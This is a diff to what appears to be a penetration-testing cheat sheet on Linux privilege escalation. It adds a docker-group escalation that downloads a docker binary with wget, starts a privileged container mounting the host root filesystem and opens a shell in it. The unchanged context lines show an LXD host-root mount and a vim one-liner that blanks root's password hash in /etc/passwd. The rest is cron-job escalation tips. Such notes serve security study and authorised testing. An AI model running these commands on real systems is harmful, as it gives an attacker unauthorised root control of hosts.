@@ -880,6 +880,18 @@ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=t
 lxc start privesc
 lxc exec privesc /bin/bash | lxc exec privesc /bin/sh
 ```
+###### docker group
+if no docker in linux
+```
+wget https://master.dockerproject.com/linux/x86_64/docker -O docker
+```
+Find docker.sock
+```
+/tmp/docker -H unix:///app/docker.sock(docker.sock file path) ps
+/tmp/docker -H unix:///app/docker.sock(docker.sock file path) run --rm -d --privileged -v /:/hostsystem main_app(image name)
+/tmp/docker -H unix:///app/docker.sock(docker.sock file path) ps
+/tmp/docker -H unix:///app/docker.sock(docker.sock file path) exec -it 7ae3bcc818af(new container id) /bin/bash
+```
 ### Abusing Capability  
 | Capability | Description |
 |---|---|
@@ -899,13 +911,14 @@ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
 $ cat /etc/passwd | head -n1 (Now we can use the command su to log in as root without being asked for the password)
 ```
 ### Cronjob to elevate privilege
-1. Always remember to check if the file has executable perm when cron job runs it, otherwise even root runs it, doesn't execute the file
-2. If the full path of the script is not defined, cron will refer to the paths listed under the PATH variable in the /etc/crontab file
+> Tip : Always remember to check if the file has executable perm when cron job runs it, otherwise even root runs it, doesn't execute the file
+
+> Tip : If the full path of the script is not defined, cron will refer to the paths listed under the PATH variable in the /etc/crontab file
 ```
 crontab -l
 ls -al /etc/cron*
 ```
-3. use 'find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null' to check world writable file, then use pspy to check for cronjobs
+1. use 'find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null' to check world writable file, then use pspy to check for cronjobs
 ###### Cron using a script with a wildcard (Wildcard Injection)
 ```
 [root@RedHat_test ~]# man tar
